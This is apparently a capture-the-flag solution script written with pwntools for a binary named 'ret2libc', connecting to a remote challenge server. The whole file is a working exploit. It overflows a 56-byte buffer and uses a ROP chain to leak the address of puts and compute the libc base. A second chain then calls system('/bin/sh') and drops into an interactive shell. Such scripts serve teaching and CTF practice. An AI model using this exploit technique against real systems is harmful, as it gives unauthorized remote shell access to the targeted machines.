#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2libc")
ld = ELF("./ld-2.31.so")
libc = ELF("./libc-2.31.so")

context.binary = exe

p = process("./ret2libc")
#gdb.attach(p)

p = remote("forever.isss.io", 9017)

pop_rdi_ret = 0x401203
ret = 0x40101a

puts_got = exe.got["puts"]
gets_got = exe.got["gets"]
log.info("puts in got: " + hex(puts_got))
puts_plt = exe.plt["puts"]

payload = b"A"*56
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(exe.sym["main"])

p.recvline()
p.sendline(payload)
p.recvline()
p.recvline()

recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, b"\x00"))
log.info("Leaked libc address, puts: "+ str(hex(leak)))

libc.address = leak - libc.symbols["puts"]

p.recvline()

libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

log.info("binsh: "+ str(hex(binsh)))
log.info("system: "+ str(hex(libc_system)))
log.info("exit: "+ str(hex(libc_exit)))

second_payload = b"A"*56
# second_payload += p64(ret)
second_payload += p64(pop_rdi_ret)
second_payload += p64(binsh)
second_payload += p64(ret)
second_payload += p64(libc_system)
#second_payload += p64(ret)
#second_payload += p64(libc_exit)

# one_gadget = libc.address + 0xe6c81

# second_payload = b"A"*56
# second_payload += p64(one_gadget)

p.sendline(second_payload)

p.interactive()



